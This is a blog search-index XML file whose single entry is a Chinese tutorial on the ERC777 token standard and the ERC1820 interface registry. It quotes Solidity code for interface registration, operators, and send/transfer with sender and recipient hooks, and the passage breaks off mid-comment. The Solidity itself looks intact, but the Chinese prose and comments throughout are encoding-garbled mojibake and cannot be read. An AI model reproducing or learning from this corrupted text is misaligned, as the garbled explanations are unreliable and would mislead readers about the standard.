<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ERC777</title>
    <link href="/2022/10/31/erc777/"/>
    <url>/2022/10/31/erc777/</url>
    
    <content type="html"><![CDATA[<h1 id="ERC777"><a href="#ERC777" class="headerlink" title="ERC777"></a>ERC777</h1><p><a href="https://eips.ethereum.org/EIPS/eip-777">ERC777 å®˜æ–¹æ–‡æ¡£</a></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/token/ERC777">ERC777 åˆçº¦ä»“åº“</a></p><p>ç”±äº ERC20 æ ‡å‡†æ²¡æœ‰ä¸€ä¸ªè½¬è´¦é€šçŸ¥æœºåˆ¶ï¼Œå¹¶ä¸”åœ¨è½¬è´¦æ—¶æ— æ³•æºå¸¦é¢å¤–çš„ä¿¡æ¯ï¼Œå› æ­¤å‡ºç°äº† ERC777 æ¥è§£å†³è¿™äº›é—®é¢˜ã€‚</p><p>ERC777 åœ¨ ERC20 çš„åŸºç¡€ä¸Šå®šä¹‰äº† <code>send(dest, value, data)</code> æ¥è½¬ç§»ä»£å¸ï¼Œ send å‡½æ•°é¢å¤–çš„å‚æ•°ç”¨æ¥æºå¸¦å…¶ä»–çš„ä¿¡æ¯ï¼Œsend å‡½æ•°ä¼šæ£€æŸ¥æŒæœ‰è€…å’Œæ¥æ”¶è€…æ˜¯å¦å®ç°äº†ç›¸åº”çš„é’©å­å‡½æ•°ï¼Œå¦‚æœæœ‰å®ç°ï¼ˆä¸ç®¡æ˜¯æ™®é€šç”¨æˆ·åœ°å€è¿˜æ˜¯åˆçº¦åœ°å€éƒ½å¯ä»¥å®ç°é’©å­å‡½æ•°ï¼‰ï¼Œåˆ™è°ƒç”¨ç›¸åº”çš„é’©å­å‡½æ•°ã€‚</p><h2 id="EIP1820"><a href="#EIP1820" class="headerlink" title="EIP1820"></a>EIP1820</h2><p><a href="https://learnblockchain.cn/docs/eips/eip-1820.html#%E7%AE%80%E8%A6%81%E8%AF%B4%E6%98%8E">EIP1820 æ–‡æ¡£</a></p><p><a href="https://learnblockchain.cn/docs/eips/eip-1820.html">ERC1820</a> å–ä»£äº† <a href="https://learnblockchain.cn/docs/eips/eip-820.html">ERC820</a>ï¼Œ <a href="https://learnblockchain.cn/docs/eips/eip-1820.html">ERC1820</a> ä¿®å¤äº† Solidty 0.5 æ›´æ–°å¸¦æ¥çš„ä¸<a href="https://learnblockchain.cn/docs/eips/eip-165.html">ERC165</a>ä¸å…¼å®¹çš„é—®é¢˜ã€‚è¿™é‡Œæ˜¯å®˜æ–¹å£°æ˜<a href="https://github.com/ethereum/EIPs/issues/820#issuecomment-464109166">erc1820-annoucement</a>ï¼Œé™¤äº†è¿™ä¸ªbugä¹‹å¤–ï¼Œ<a href="https://learnblockchain.cn/docs/eips/eip-1820.html">ERC1820</a> åŠŸèƒ½ä¸Šç­‰ä»·äº <a href="https://learnblockchain.cn/docs/eips/eip-820.html">ERC820</a>ã€‚</p><p>ERC1820 æ ‡å‡†å®šä¹‰äº†ä¸€ä¸ªé€šç”¨æ³¨å†Œè¡¨åˆçº¦ï¼Œä»»ä½•åœ°å€ï¼ˆåˆçº¦æˆ–æ™®é€šç”¨æˆ·å¸æˆ·ï¼‰éƒ½å¯ä»¥æ³¨å†Œå®ƒæ”¯æŒçš„æ¥å£ä»¥åŠå“ªä¸ªæ™ºèƒ½åˆçº¦è´Ÿè´£æ¥å£å®ç°ã€‚</p><p>ERC1820æ ‡å‡†å®šä¹‰æ™ºèƒ½åˆçº¦å’Œæ™®é€šç”¨æˆ·å¸æˆ·å¯ä»¥å‘æ³¨å†Œè¡¨å‘å¸ƒå…¶å®ç°äº†å“ªäº›åŠŸèƒ½ï¼ˆæ™®é€šç”¨æˆ·å¸æˆ·é€šè¿‡ä»£ç†åˆçº¦å®ç°ï¼‰</p><p>ä»»ä½•äººéƒ½å¯ä»¥æŸ¥è¯¢æ­¤æ³¨å†Œè¡¨ï¼Œè¯¢é—®å“ªä¸ªåœ°å€æ˜¯å¦å®ç°äº†ç»™å®šçš„æ¥å£ä»¥åŠå“ªä¸ªæ™ºèƒ½åˆçº¦å¤„ç†å®ç°é€»è¾‘ã€‚</p><p>ERC1820æ³¨å†Œè¡¨åˆçº¦å¯ä»¥éƒ¨ç½²åœ¨ä»»ä½•é“¾ä¸Šï¼Œå¹¶åœ¨æ‰€æœ‰é“¾ä¸Šçš„åœ°å€æ˜¯ç›¸åŒçš„ã€‚</p><p>æ¥å£çš„å28ä¸ªå­—èŠ‚éƒ½ä¸º0çš„è¯ï¼Œä¼šè®¤ä¸ºæ˜¯ <a href="https://learnblockchain.cn/docs/eips/eip-165.html">ERC165</a> æ¥å£ï¼Œå¹¶ä¸”æ³¨å†Œè¡¨å°†è½¬å‘åˆ°åˆçº¦ä»¥æŸ¥çœ‹æ˜¯å¦å®ç°äº†æ¥å£ã€‚</p><p>æ­¤åˆçº¦è¿˜å……å½“ <a href="https://learnblockchain.cn/docs/eips/eip-165.html">ERC165</a> ç¼“å­˜ï¼Œä»¥å‡å°‘ gas æ¶ˆè€—ã€‚</p><p>è¿™é‡Œä»‹ç» <a href="https://github.com/0xjac/ERC1820/blob/master/contracts/ERC1820Registry.sol">ERC1820 æ³¨å†Œè¡¨åˆçº¦</a> ä¸­çš„ä¸¤ä¸ªä¸»è¦å‡½æ•°</p><p>setInterfaceImplementer è®¾ç½®æŸä¸ªåœ°å€çš„æ¥å£ç”±å“ªä¸ªåˆçº¦å®ç°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @notice è®¾ç½®æŸä¸ªåœ°å€çš„æ¥å£ç”±å“ªä¸ªåˆçº¦å®ç°ï¼Œéœ€è¦ç”±ç®¡ç†å‘˜æ¥è®¾ç½®ã€‚ï¼ˆæ¯ä¸ªåœ°å€æ˜¯ä»–è‡ªå·±çš„ç®¡ç†å‘˜ï¼Œç›´åˆ°è®¾ç½®äº†ä¸€ä¸ªæ–°çš„åœ°å€ï¼‰ã€‚<br>/// @param _addr å¾…è®¾ç½®çš„å…³è”æ¥å£çš„åœ°å€ï¼ˆå¦‚æœ&#x27;_addr&#x27;æ˜¯é›¶åœ°å€ï¼Œåˆ™å‡å®šä¸º&#x27;msg.sender&#x27;ï¼‰<br>/// @param _interfaceHash æ¥å£ï¼Œå®ƒæ˜¯æ¥å£åç§°å­—ç¬¦ä¸²çš„ keccak256 å“ˆå¸Œå€¼<br>/// ä¾‹å¦‚: &#x27;web3.utils.keccak256(&quot;ERC777TokensRecipient&quot;)&#x27; è¡¨ç¤º &#x27;ERC777TokensRecipient&#x27; æ¥å£ã€‚<br>/// @param _implementer ä¸ºåœ°å€&#x27;_addr&#x27;å®ç°äº† &#x27;_interfaceHash&#x27;æ¥å£çš„åˆçº¦åœ°å€<br>function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external &#123;<br>    address addr = _addr == address(0) ? msg.sender : _addr;<br>    require(getManager(addr) == msg.sender, &quot;Not the manager&quot;);<br><br>    require(!isERC165Interface(_interfaceHash), &quot;Must not be an ERC165 hash&quot;);<br>    if (_implementer != address(0) &amp;&amp; _implementer != msg.sender) &#123;<br>        require(<br>            ERC1820ImplementerInterface(_implementer)<br>                .canImplementInterfaceForAddress(_interfaceHash, addr) == ERC1820_ACCEPT_MAGIC,<br>            &quot;Does not implement the interface&quot;<br>        );<br>    &#125;<br>    interfaces[addr][_interfaceHash] = _implementer;<br>    emit InterfaceImplementerSet(addr, _interfaceHash, _implementer);<br>&#125;<br></code></pre></td></tr></table></figure><p>getInterfaceImplementer æŸ¥è¯¢åœ°å€æ˜¯å¦å®ç°äº†æ¥å£ä»¥åŠé€šè¿‡å“ªä¸ªåˆçº¦å®ç°çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @notice æŸ¥è¯¢åœ°å€æ˜¯å¦å®ç°äº†æ¥å£ä»¥åŠé€šè¿‡å“ªä¸ªåˆçº¦å®ç°çš„ã€‚<br>/// @param _addr æŸ¥è¯¢åœ°å€ï¼ˆå¦‚æœ&#x27;_addr&#x27;æ˜¯é›¶åœ°å€ï¼Œåˆ™å‡å®šä¸º&#x27;msg.sender&#x27;ï¼‰ã€‚<br>/// @param _interfaceHash æŸ¥è¯¢æ¥å£ï¼Œå®ƒæ˜¯æ¥å£åç§°å­—ç¬¦ä¸²çš„ keccak256 å“ˆå¸Œå€¼<br>/// ä¾‹å¦‚: &#x27;web3.utils.keccak256(&quot;ERC777TokensRecipient&quot;)&#x27; è¡¨ç¤º &#x27;ERC777TokensRecipient&#x27; æ¥å£.<br>/// @return è¿”å›å®ç°è€…çš„åœ°å€ï¼Œæ²¡æœ‰å®ç°è¿”å› â€˜0â€™<br>function getInterfaceImplementer(address _addr, bytes32 _interfaceHash) external view returns (address) &#123;<br>    address addr = _addr == address(0) ? msg.sender : _addr;<br>    if (isERC165Interface(_interfaceHash)) &#123;<br>        bytes4 erc165InterfaceHash = bytes4(_interfaceHash);<br>        return implementsERC165Interface(addr, erc165InterfaceHash) ? addr : address(0);<br>    &#125;<br>    return interfaces[addr][_interfaceHash];<br>&#125;<br></code></pre></td></tr></table></figure><p>ERC777 ä½¿ç”¨ send è½¬è´¦æ—¶ä¼šåˆ†åˆ«åœ¨æŒæœ‰è€…å’Œæ¥æ”¶è€…åœ°å€ä¸Šä½¿ç”¨ ERC1820 çš„getInterfaceImplementer å‡½æ•°è¿›è¡ŒæŸ¥è¯¢ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å¯¹åº”çš„å®ç°åˆçº¦ï¼ŒERC777 æ ‡å‡†è§„èŒƒé‡Œé¢„å®šäº†æ¥å£åŠå‡½æ•°åç§°ï¼Œå¦‚æœæœ‰å®ç°åˆ™è¿›è¡Œç›¸åº”çš„è°ƒç”¨ã€‚</p><h2 id="åŸºæœ¬å˜é‡"><a href="#åŸºæœ¬å˜é‡" class="headerlink" title="åŸºæœ¬å˜é‡"></a>åŸºæœ¬å˜é‡</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// ERC1820 æ³¨å†Œè¡¨åˆçº¦åœ°å€<br>IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);<br><br>mapping(address =&gt; uint256) private _balances;<br><br>uint256 private _totalSupply;<br><br>string private _name;<br>string private _symbol;<br><br><br>// å‘é€è€…æ¥å£hash ç¡¬ç¼–ç  keccak256(&quot;ERC777TokensSender&quot;) ä¸ºäº†å‡å°‘ gasï¼Œ ç”¨æˆ·æŸ¥è¯¢æ˜¯å¦å®ç°äº†å¯¹åº”çš„æ¥å£ã€‚<br>bytes32 constant private TOKENS_SENDER_INTERFACE_HASH =<br>    0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;<br><br>// keccak256(&quot;ERC777TokensRecipient&quot;)<br>bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH =<br>    0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;<br><br>// ä¿å­˜é»˜è®¤æ“ä½œè€…åˆ—è¡¨ï¼Œåªèƒ½åœ¨ä»£å¸åˆ›å»ºæ—¶å®šä¹‰<br>address[] private _defaultOperatorsArray;<br><br>// ä¸ºäº†ç´¢å¼•é»˜è®¤æ“ä½œè€…çŠ¶æ€ ä½¿ç”¨çš„mapping<br>mapping(address =&gt; bool) private _defaultOperators;<br><br>// ä¿å­˜æˆæƒçš„æ“ä½œè€…<br>mapping(address =&gt; mapping(address =&gt; bool)) private _operators;<br>// ä¿å­˜å–æ¶ˆæˆæƒçš„é»˜è®¤æ“ä½œè€…<br>mapping(address =&gt; mapping(address =&gt; bool)) private _revokedDefaultOperators;<br><br>// ä¸ºäº†å…¼å®¹ ERC20 ï¼ˆæˆæƒä¿¡æ¯ï¼‰<br>mapping (address =&gt; mapping (address =&gt; uint256)) private _allowances;<br></code></pre></td></tr></table></figure><h2 id="æ„é€ å‡½æ•°"><a href="#æ„é€ å‡½æ•°" class="headerlink" title="æ„é€ å‡½æ•°"></a>æ„é€ å‡½æ•°</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev `defaultOperators` å¯ä»¥ä¸ºç©º.<br> */<br>constructor(<br>    string memory name,<br>    string memory symbol,<br>    address[] memory defaultOperators<br>) public &#123;<br>    _name = name;<br>    _symbol = symbol;<br><br>    // åˆå§‹åŒ–é»˜è®¤æ“ä½œè€…åˆ—è¡¨<br>    _defaultOperatorsArray = defaultOperators;<br>    for (uint256 i = 0; i &lt; _defaultOperatorsArray.length; i++) &#123;<br>        _defaultOperators[_defaultOperatorsArray[i]] = true;<br>    &#125;<br><br>    // æ³¨å†Œæ¥å£<br>    _erc1820.setInterfaceImplementer(address(this), keccak256(&quot;ERC777Token&quot;), address(this));<br>    _erc1820.setInterfaceImplementer(address(this), keccak256(&quot;ERC20Token&quot;), address(this));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æŸ¥è¯¢å‡½æ•°"><a href="#æŸ¥è¯¢å‡½æ•°" class="headerlink" title="æŸ¥è¯¢å‡½æ•°"></a>æŸ¥è¯¢å‡½æ•°</h2><p>name()ï¼Œsymbol()ï¼ŒtotalSupply()ï¼ŒbalanceOf(address) å’Œå«ä¹‰å’Œåœ¨ERC20 ä¸­å®Œå…¨ä¸€æ ·ã€‚</p><p>granularity() ç”¨æ¥å®šä¹‰ä»£å¸æœ€å°çš„åˆ’åˆ†ç²’åº¦ï¼ˆ&gt;=1ï¼‰ï¼Œ è¦æ±‚å¿…é¡»åœ¨åˆ›å»ºæ—¶è®¾å®šï¼Œä¹‹åä¸å¯ä»¥æ›´æ”¹ï¼Œä¸ç®¡æ˜¯åœ¨é“¸å¸ã€å‘é€è¿˜æ˜¯é”€æ¯æ“ä½œçš„ä»£å¸æ•°é‡ï¼Œå¿…éœ€æ˜¯ç²’åº¦çš„æ•´æ•°å€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function name() public view returns (string memory) &#123;<br>    return _name;<br>&#125;<br><br>function symbol() public view returns (string memory) &#123;<br>    return _symbol;<br>&#125;<br><br>// å®šä¹‰å°æ•°ä½æ•°ï¼Œä¸ºäº†å…¼å®¹ ERC20<br>function decimals() public pure returns (uint8) &#123;<br>    return 18;<br>&#125;<br><br>// é»˜è®¤ç²’åº¦ä¸º1ï¼Œç²’åº¦è¡¨ç¤ºä»£å¸æœ€å°çš„åˆ†éš”å•ä½ <br>function granularity() public view returns (uint256) &#123;<br>    return 1;<br>&#125;<br><br>function totalSupply() public view returns (uint256) &#123;<br>    return _totalSupply;<br>&#125;<br><br>function balanceOf(address tokenHolder) public view returns (uint256) &#123;<br>    return _balances[tokenHolder];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ“ä½œå‘˜"><a href="#æ“ä½œå‘˜" class="headerlink" title="æ“ä½œå‘˜"></a>æ“ä½œå‘˜</h2><p>ERC777 å®šä¹‰äº†ä¸€ä¸ªæ–°çš„æ“ä½œå‘˜è§’è‰²ï¼Œæ“ä½œå‘˜è¢«ä½œä¸ºç§»åŠ¨ä»£å¸çš„åœ°å€ã€‚ æ¯ä¸ªåœ°å€ç›´è§‚åœ°ç§»åŠ¨è‡ªå·±çš„ä»£å¸ï¼Œå°†æŒæœ‰äººå’Œæ“ä½œå‘˜çš„æ¦‚å¿µåˆ†å¼€å¯ä»¥æä¾›æ›´å¤§çš„çµæ´»æ€§ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// æ˜¯å¦æ˜¯æ“ä½œå‘˜<br>function isOperatorFor(<br>    address operator,<br>    address tokenHolder<br>) public view returns (bool) &#123;<br>    return operator == tokenHolder ||<br>        (_defaultOperators[operator] &amp;&amp; !_revokedDefaultOperators[tokenHolder][operator]) ||<br>        _operators[tokenHolder][operator];<br>&#125;<br><br>// æˆæƒæ“ä½œå‘˜<br>function authorizeOperator(address operator) external &#123;<br>    require(msg.sender != operator, &quot;ERC777: authorizing self as operator&quot;);<br><br>    if (_defaultOperators[operator]) &#123;<br>        delete _revokedDefaultOperators[msg.sender][operator];<br>    &#125; else &#123;<br>        _operators[msg.sender][operator] = true;<br>    &#125;<br><br>    emit AuthorizedOperator(operator, msg.sender);<br>&#125;<br><br>// æ’¤é”€æ“ä½œå‘˜<br>function revokeOperator(address operator) external &#123;<br>    require(operator != msg.sender, &quot;ERC777: revoking self as operator&quot;);<br><br>    if (_defaultOperators[operator]) &#123;<br>        _revokedDefaultOperators[msg.sender][operator] = true;<br>    &#125; else &#123;<br>        delete _operators[msg.sender][operator];<br>    &#125;<br><br>    emit RevokedOperator(operator, msg.sender);<br>&#125;<br><br>// é»˜è®¤æ“ä½œè€…<br>function defaultOperators() public view returns (address[] memory) &#123;<br>    return _defaultOperatorsArray;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="è½¬è´¦é€»è¾‘"><a href="#è½¬è´¦é€»è¾‘" class="headerlink" title="è½¬è´¦é€»è¾‘"></a>è½¬è´¦é€»è¾‘</h2><p>å¦‚æœæŒæœ‰è€…å¸Œæœ›åœ¨è½¬è´¦æ—¶æ”¶åˆ°ä»£å¸è½¬ç§»é€šçŸ¥ï¼Œå°±éœ€è¦åœ¨ERC1820åˆçº¦ä¸Šæ³¨å†ŒåŠå®ç° <code>ERC777TokensSender</code> æ¥å£</p><p>å¦‚æœæ¥æ”¶è€…å¸Œæœ›åœ¨è½¬è´¦æ—¶æ”¶åˆ°ä»£å¸è½¬ç§»é€šçŸ¥ï¼Œå°±éœ€è¦åœ¨ERC1820åˆçº¦ä¸Šæ³¨å†ŒåŠå®ç° <code>ERC777TokensRecipient</code> æ¥å£</p><p>æ³¨æ„: å¯¹äºæ‰€æœ‰çš„ ERC777 åˆçº¦ï¼Œ ä¸€ä¸ªæŒæœ‰è€…åœ°å€åªèƒ½æ³¨å†Œä¸€ä¸ªERC777TokensSenderæ¥å£å®ç°ã€‚å› æ­¤ ERC777TokensSender å®ç°ä¼šè¢«å¤šä¸ªERC777åˆçº¦è°ƒç”¨ï¼Œåœ¨ERC777TokensSenderæ¥å£çš„å®ç°åˆçº¦é‡Œï¼Œ msg.sender æ˜¯ERC777åˆçº¦åœ°å€ï¼Œè€Œä¸æ˜¯æ“ä½œè€…ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs solidity">   // ERC777 å®šä¹‰çš„è½¬è´¦å‡½æ•°ï¼Œ åŒæ—¶è§¦å‘ ERC20çš„ `Transfer` äº‹ä»¶<br>   function send(address recipient, uint256 amount, bytes calldata data) external &#123;<br>       _send(msg.sender, msg.sender, recipient, amount, data, &quot;&quot;, true);<br>   &#125;<br>   <br>   // è½¬ç§»ä»£å¸ï¼Œéœ€è¦æœ‰æ“ä½œè€…æƒé™ï¼Œè§¦å‘ `Sent` å’Œ `Transfer` äº‹ä»¶<br>   function operatorSend(<br>       address sender,<br>       address recipient,<br>       uint256 amount,<br>       bytes calldata data,<br>       bytes calldata operatorData<br>   )<br>   external<br>   &#123;<br>       require(isOperatorFor(msg.sender, sender), &quot;ERC777: caller is not an operator for holder&quot;);<br>       _send(msg.sender, sender, recipient, amount, data, operatorData, true);<br>   &#125;<br>   <br>   // ä¸ºå…¼å®¹ ERC20ï¼ŒåŒæ—¶è§¦å‘ `Sent` äº‹ä»¶<br>   function transfer(address recipient, uint256 amount) external returns (bool) &#123;<br>       require(recipient != address(0), &quot;ERC777: transfer to the zero address&quot;);<br><br>       address from = msg.sender;<br><br>       _callTokensToSend(from, from, recipient, amount, &quot;&quot;, &quot;&quot;);<br><br>       _move(from, from, recipient, amount, &quot;&quot;, &quot;&quot;);<br><br>       //æœ€åä¸€ä¸ªå‚æ•°è¡¨ç¤ºä¸è¦æ±‚æ¥æ”¶è€…å®ç°é’©å­å‡½æ•° `tokensReceived`<br>       _callTokensReceived(from, from, recipient, amount, &quot;&quot;, &quot;&quot;, false);<br><br>       return true;<br>   &#125;<br>   <br>   // è½¬ç§» token<br>   // æœ€åä¸€ä¸ªå‚æ•° requireReceptionAck è¡¨ç¤ºæ˜¯å¦å¿…é¡»å®ç° ERC777TokensRecipient<br>   function _send(<br>       address operator,<br>       address from,<br>       address to,<br>       uint256 amount,<br>       bytes memory userData,<br>       bytes memory operatorData,<br>       bool requireReceptionAck<br>   )<br>       private<br>   &#123;<br>       require(from != address(0), &quot;ERC777: send from the zero address&quot;);<br>       require(to != address(0), &quot;ERC777: send to the zero address&quot;);<br><br>       // åœ¨ä¿®æ”¹ä½™é¢çŠ¶æ€ä¹‹å‰è°ƒç”¨tokensToSend <br>       _callTokensToSend(operator, from, to, amount, userData, operatorData);<br><br>       // ä¿®æ”¹ä½™é¢çŠ¶æ€<br>       _move(operator, from, to, amount, userData, operatorData);<br><br>       // åœ¨ä¿®æ”¹ä½™é¢çŠ¶æ€ä¹‹åè°ƒç”¨tokensReceived <br>       _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);<br>   &#125;<br><br>// è½¬ç§»æ‰€æœ‰æƒ<br>   function _move(<br>       address operator,<br>       address from,<br>       address to,<br>       uint256 amount,<br>       bytes memory userData,<br>       bytes memory operatorData<br>   )<br>       private<br>   &#123;<br>       _balances[from] = _balances[from].sub(amount);<br>       _balances[to] = _balances[to].add(amount);<br><br>       emit Sent(operator, from, to, amount, userData, operatorData);<br>       emit Transfer(from, to, amount);<br>   &#125;<br>   <br>   // å°è¯•è°ƒç”¨æŒæœ‰è€…çš„ tokensToSend() å‡½æ•°<br>   // å¦‚æœæŒæœ‰è€…æœ‰é€šè¿‡ ERC1820 æ³¨å†Œ ERC777TokensSender å®ç°æ¥å£ï¼Œ ä»£å¸åˆçº¦å¿…é¡»è°ƒç”¨å…¶ tokensToSend é’©å­å‡½æ•°<br>   function _callTokensToSend(<br>       address operator,<br>       address from,<br>       address to,<br>       uint256 amount,<br>       bytes memory userData,<br>       bytes memory operatorData<br>   )<br>       private<br>   &#123;<br>       address implementer = _erc1820.getInterfaceImplementer(from, TOKENS_SENDER_INTERFACE_HASH);<br>       if (implementer != address(0)) &#123;<br>           IERC777Sender(implementer).tokensToSend(operator, from, to, amount, userData, operatorData);<br>       &#125;<br>   &#125;<br><br>  // å°è¯•è°ƒç”¨æ¥æ”¶è€…çš„ tokensReceived()<br>  // å¦‚æœæ¥æ”¶è€…æœ‰é€šè¿‡ ERC1820 æ³¨å†Œ ERC777TokensRecipient å®ç°æ¥å£ï¼Œ ä»£å¸åˆçº¦å¿…é¡»è°ƒç”¨å…¶ tokensReceived é’©å­å‡½æ•°ã€‚<br>  function _callTokensReceived(<br>       address operator,<br>       address from,<br>       address to,<br>       uint256 amount,<br>       bytes memory userData,<br>       bytes memory operatorData,<br>       bool requireReceptionAck<br>   )<br>       private<br>   &#123;<br>       address implementer = _erc1820.getInterfaceImplementer(to, TOKENS_RECIPIENT_INTERFACE_HASH);<br>       if (implementer != address(0)) &#123;<br>           IERC777Recipient(implementer).tokensReceived(operator, from, to, amount, userData, operatorData);<br>       &#125; else if (requireReceptionAck) &#123;<br>           // å¦‚æœæ¥æ”¶è€…æ˜¯ä¸€ä¸ªåˆçº¦åœ°å€ï¼Œ åˆ™å¿…é¡»è¦æ³¨å†ŒåŠå®ç° ERC777TokensRecipient æ¥å£ï¼ˆè¿™æ 